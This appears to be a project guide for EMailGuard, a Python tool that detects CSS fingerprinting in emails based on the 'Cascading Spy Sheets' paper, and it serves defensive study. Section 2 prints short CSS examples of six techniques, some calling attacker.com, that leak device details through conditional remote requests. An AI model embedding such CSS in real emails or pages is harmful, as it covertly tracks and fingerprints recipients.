
# EMailGuard – CSS Email Fingerprinting Analyzer

**A Beginner-Friendly Guide to Detecting CSS‑Based Tracking in Emails**

This document explains the **EMailGuard** project from the ground up.  
It covers why CSS fingerprinting is a threat, how the research paper *Cascading Spy Sheets* uncovered new techniques, how EMailGuard detects them, and how you can use or extend the tool.

---

## 1. The Problem: Tracking Without JavaScript

You probably know that websites use **JavaScript** to collect information about your browser – screen size, installed fonts, language, etc. This is called **browser fingerprinting**, and it allows advertisers to recognise you even if you delete cookies.

To block this, many people disable JavaScript (for example, the Tor Browser does this).  
**But**: a website can still fingerprint you using only **CSS** – the language that defines colours, fonts, and layout. CSS is always enabled; you cannot “disable” it without breaking the web.

Now imagine receiving an **HTML email**. Email clients (Gmail, Outlook, Thunderbird, Apple Mail) also support CSS, but they usually block JavaScript and iframes. So researchers thought emails were safe from fingerprinting.  
The paper *Cascading Spy Sheets* (NDSS 2025) proved that **even emails can be used for fingerprinting** using clever CSS tricks.

**EMailGuard** is a tool that scans an email (`.eml` file) and tells you whether it contains CSS fingerprinting techniques – before you open it.

---

## 2. CSS Fingerprinting Techniques (the “Attacks”)

The paper describes several ways an attacker can learn things about your computer or email client just by making your email client load a specific CSS rule. The attacker “asks a yes/no question” (e.g., “is font X installed?”) and the answer is sent to their server via a **remote request** (like loading an image).

Here are the six techniques that EMailGuard detects:

### 2.1 `@import` Chain
The attacker loads an external CSS file from their server. This file can change depending on your system.  
**Example:**
```css
@import url("https://attacker.com/style.css");
```

### 2.2 `@media` Conditional
Like a mini-program: “If the screen width is less than 500px, load this background image.” The image URL is different for different conditions, so the attacker sees which condition was true.  
**Example:**
```css
@media (max-width: 500px) {
  body { background-image: url("/small-screen"); }
}
```

### 2.3 `@container` Query
A newer CSS feature that checks the size of a parent container (not the whole screen). Attackers use it together with font‑relative units (`ch`, `ex`, `ic`, `cap`) to detect if a specific font is installed.  
**Example from the paper (Listing 1):**
```css
@container (width > 7.5px) {
  * { background-image: url("/office-yes"); }
}
```
This checks for the font *Leelawadee* (installed with Microsoft Office).

### 2.4 `calc()` Expression
CSS can do maths, including trigonometric functions (`sin`, `cos`, etc.). Different operating systems, CPU architectures (Intel vs ARM), and browser versions produce **slightly different results** for the same calculation. The attacker measures the result indirectly via a container query.  
**Example:**
```css
width: calc(sin(45deg) * 100px);
```

### 2.5 `@font-face` Remote
The attacker asks the email client to download a font from their server. The very act of downloading reveals the client’s IP address and user agent – but also, different fonts are requested depending on earlier checks.  
**Example:**
```css
@font-face { src: url("https://attacker.com/font.woff"); }
```

### 2.6 `@supports` Probe
Checks if a certain CSS feature is supported by the browser. Attackers combine many such probes to build a unique fingerprint.  
**Example:**
```css
@supports (display: flex) {
  body { background-image: url("/flex-supported"); }
}
```

> **All these techniques share one thing:** they trigger a remote request **only when a certain condition is true**. The attacker’s server logs which URL was requested, thus receiving the answer.

---

## 3. What EMailGuard Does (and Does Not Do)

EMailGuard is a **static analysis tool** – it reads the email file, extracts the CSS, and looks for the patterns listed above.

| **What EMailGuard does** | **What EMailGuard does NOT do** |
|--------------------------|--------------------------------|
| Parses `.eml` files (MIME format) | Render the email |
| Extracts HTML and all CSS (`<style>`, inline `style=""`, `<link>`, `@import`) | Execute JavaScript |
| Detects 6 fingerprinting techniques | Make any network request |
| Finds correlations (e.g., `@import` + `@media`) | Tell you if a real attack happened – only if the *capability* exists |
| Assigns a risk score (0–100) and a label (Safe / Moderate / High / Critical) | |
| Produces an HTML report with explanations and mitigations | |

Because it never loads remote resources, it is **safe to run on any email** – no tracking back to the attacker.

---

## 4. Architecture Overview

EMailGuard is written in Python. It follows a modular pipeline:

```text
┌─────────────┐     ┌──────────────┐     ┌────────────────┐     ┌────────────┐
│  .eml file  │────▶│ Parser       │────▶│ CSS Extractor  │────▶│ Detectors  │
└─────────────┘     └──────────────┘     └────────────────┘     └─────┬──────┘
                                                                       │
                                                                       ▼
┌─────────────┐     ┌──────────────┐     ┌────────────────┐     ┌────────────┐
│ HTML Report │◀────│ Reporter     │◀────│ Risk Scoring   │◀────│ Correlation│
└─────────────┘     └──────────────┘     └────────────────┘     └────────────┘
```

### 4.1 Parser (`eml_parser.py`)
- Reads the `.eml` file using Python’s built-in `email` module.
- Decodes base64 / quoted-printable.
- Finds the `text/html` part and extracts metadata (Subject, From, Date).

### 4.2 CSS Extractor (`css_extractor.py`)
- Uses `beautifulsoup4` to parse the HTML.
- Collects:
  - Content of `<style>` tags.
  - Value of every `style="..."` attribute.
  - URLs from `<link rel="stylesheet">`.
  - `@import` statements inside CSS or HTML.
- Returns a plain list of CSS strings.

### 4.3 Detectors (6 independent modules)
Each detector scans the CSS strings with regular expressions and returns a list of **Finding** objects. A Finding contains:
- `technique` – e.g., "Container Query with Font Units"
- `snippet` – the exact CSS that matched
- `risk_level` – Critical / High / Medium / Low
- `paper_section` – where to read more (e.g., "Section IV-A")
- `description` – plain‑English explanation
- `mitigation` – how to block this technique

### 4.4 Correlation Engine
Looks for **combinations** of findings that are more dangerous than individually.  
Example: `@import` (loads external CSS) + `@media` with `url()` (exfiltrates data) → a complete attack chain.  
Each correlation adds a **boost** (5–20 points) to the final risk score.

### 4.5 Risk Scoring
- **Base score** per finding: Critical=30, High=15, Medium=8, Low=3.
- **Total score** = min(100, sum(base scores) + sum(boosts)).
- **Label**:
  - 0–20 → Safe
  - 21–45 → Moderate
  - 46–70 → High
  - 71–100 → Critical

### 4.6 Reporter (`html_reporter.py`)
Uses Jinja2 templates to generate a standalone HTML report. The report includes:
- Email metadata
- Risk badge (colour‑coded)
- Table of findings (expandable snippet)
- Correlation insights
- Mitigation summary (from paper Section IX‑B)

### 4.7 Interfaces
- **CLI** (`main.py`):  
  ```bash
  python main.py --input suspicious.eml --output report.html --verbose
  ```
- **Web app** (Flask):  
  Upload an `.eml` file through a browser, view the report instantly, and download it.

---

## 5. How to Use EMailGuard

### 5.1 Installation
```bash
git clone https://github.com/your-repo/emailguard.git
cd emailguard
python -m venv venv
source venv/bin/activate   # or venv\Scripts\activate on Windows
pip install -r requirements.txt
```

### 5.2 Run the CLI
```bash
python main.py --input test_samples/paper_pocs/officedetect.eml --output report.html
```
Then open `report.html` in your browser.

### 5.3 Run the Web App
```bash
python web_app.py
```
Visit `http://127.0.0.1:5000` in your browser.

### 5.4 Test the Tool
We provide a dataset of 15–20 emails organised as:
```
test_samples/
├── paper_pocs/       # 4–5 official .eml from the paper’s artifact
├── synthetic/        # 5–8 custom attack emails (nested @media, etc.)
└── clean/            # 5–10 safe newsletters
```
Run the integration test:
```bash
pytest tests/test_integration.py
```

---

## 6. Dataset: Where the Emails Come From

| Category | Source | How to obtain |
|----------|--------|---------------|
| **Paper PoCs** | Official artifact | `git clone https://github.com/cispa/cascading-spy-sheets` then copy `pocs/email/*.eml` |
| **Synthetic attacks** | Created by modifying PoCs | Manually write CSS that nests media queries, obfuscates `calc()`, adds multiple `@import`, etc. |
| **Clean emails** | Your own inbox | Export newsletters (as `.eml`) from Thunderbird, Outlook, or Gmail. Ensure they contain no fingerprinting CSS. |

> **Important**: Never share emails that contain personal information. Use only emails you have permission to analyse.

---

## 7. Evaluation Metrics (How Well Does It Work?)

The paper’s authors and this project measure success with these numbers:

| Metric | Goal | How to measure |
|--------|------|----------------|
| **Detection rate (paper PoCs)** | 100% | (detected / total paper PoCs) × 100 |
| **Detection rate (synthetic)** | ≥80% | (detected / total synthetic) × 100 |
| **False positive rate** | ≤10% | (clean flagged as risky / total clean) × 100 |
| **Average processing time** | <2 sec per email | Run on all emails, divide total time by count |
| **Per‑detector accuracy** | ≥90% | Unit tests with known positive and negative cases |

---

## 8. Mitigations: How to Protect Yourself

If you find that an email contains CSS fingerprinting techniques, you are not helpless. The paper proposes two main defences:

### 8.1 For Email Clients (or Email Proxies)
- **Rewrite all CSS to inline styles** (`style="..."`).  
  This removes at‑rules (`@media`, `@import`, etc.) which are required for almost all fingerprinting.
- **Preload all remote resources** – convert every `url(...)` into a `data:` URL (embed the image directly).  
  The attacker then cannot see which resource was requested because *everything* is requested unconditionally.
- **Use a proxy** that fetches external content once and serves it locally.  
  This hides your real IP address and user agent.

### 8.2 For Browser Users (if you also browse the web)
- Install extensions that preload conditional CSS resources (the paper provides a Firefox extension).
- Use browsers with built‑in anti‑fingerprinting (Tor Browser, Brave) – but note that the paper found exceptions (e.g., Gill Sans font leak in Tor).

EMailGuard’s report includes a **Mitigation** column for each finding, so you know exactly what to disable.

---

## 9. Relationship to the Research Paper

Every detector in EMailGuard is directly based on a specific section of *Cascading Spy Sheets*:

| Detector | Paper Section | Description in paper |
|----------|---------------|----------------------|
| `@import` chain | IV‑B, VIII‑C2 | Import rules bypass sanitisation; used in SOGo email client (CVE‑2024‑24510) |
| `@media` conditional | III‑B, IV‑A3 | Classic viewport probing, now replicable with container queries |
| `@container` query | IV‑A, Listing 1, Fig.2 | Font detection via `ch`, `ex`, `ic`, `cap` units |
| `calc()` expression | V‑A, Listing 3 | Trigonometric functions reveal OS, CPU architecture |
| `@font-face` remote | III‑B, IV‑C1 | Traditional font fingerprinting via remote font loading |
| `@supports` probe | IV‑B, IV‑C2 | Query feature support to identify browser version |

The **correlation engine** and **risk scoring** are our own additions to make the tool practical.

---

## 10. Glossary (Jargon Explained)

| Term | What it means |
|------|---------------|
| **CSS at‑rule** | A CSS statement that starts with `@`, e.g., `@media`, `@import`. It changes *how* CSS is applied. |
| **Container query** | A new CSS feature that applies styles based on the size of a parent element (not the whole screen). |
| **Exfiltration** | The act of sending stolen data (e.g., “font X is installed”) to an attacker’s server. |
| **Fingerprinting** | Collecting many small facts about a user’s device to create a unique ID. |
| **MIME** | The format that allows emails to contain HTML, attachments, and different encodings. |
| **.eml file** | A plain‑text file that stores a complete email (headers, body, attachments). |
| **Static analysis** | Examining code without running it. EMailGuard never executes CSS or fetches URLs. |
| **Tracking pixel** | A tiny invisible image in an email. When loaded, it tells the sender that you opened the email. |

---

## 11. References

- **Research Paper**: Trampert et al., *Cascading Spy Sheets: Exploiting the Complexity of Modern CSS for Email and Browser Fingerprinting*, NDSS 2025.  
  [Official artifact](https://github.com/cispa/cascading-spy-sheets)
- **SRS (Software Requirements Specification)** – detailed functional and non‑functional requirements (included in project).
- **Roadmap** – 4‑week development plan with daily tasks.

---

## 12. Frequently Asked Questions

**Q: Can EMailGuard block fingerprinting?**  
A: No, it only *detects* it. But the report tells you which mitigations to apply (e.g., use a proxy that inlines resources).

**Q: Do I need to understand the paper to use the tool?**  
A: No. The tool explains each finding in plain English and cites the paper section if you want to dive deeper.

**Q: What if an email uses obfuscated CSS (e.g., `@m`+`edia`)?**  
A: EMailGuard uses regular expressions that can be evaded by clever obfuscation. That’s why we have a synthetic dataset with obfuscated examples – to measure how well the tool performs. In a real deployment, you can improve the detectors to handle more patterns.

**Q: Is it legal to analyse emails?**  
A: Only if you own the emails or have permission. Never run EMailGuard on emails you are not authorised to read.

**Q: Can I run EMailGuard on a whole mailbox?**  
A: Yes – just loop over all `.eml` files. The CLI accepts one file at a time, but you can easily script it.

---

## 13. Extending the Tool (For Developers)

EMailGuard is designed to be modular. To add a new detector:
1. Create a new file in `detectors/`, e.g., `detector_new.py`.
2. Write a function that takes a list of CSS strings and returns a list of `Finding` objects.
3. Register the detector in `main.py` (or the web app’s processing function).

To change risk scoring, edit `risk_scorer.py`. The scoring logic is simple arithmetic – you can add weights for new techniques.

---

## 14. Final Words

CSS fingerprinting is a real threat, and it works even inside emails – a place many people thought was safe. **EMailGuard** gives you a practical, educational tool to detect these techniques. Whether you are a security researcher, an email administrator, or just a curious user, you can now inspect emails before trusting them.

Remember: the best defence is to use an email client or proxy that **preloads all remote resources** and **inlines CSS** – exactly as the paper’s authors recommend.

Happy (safe) emailing!

---
*This document is part of the EMailGuard project – see `README.md` for installation and `SRS.md` for full requirements.*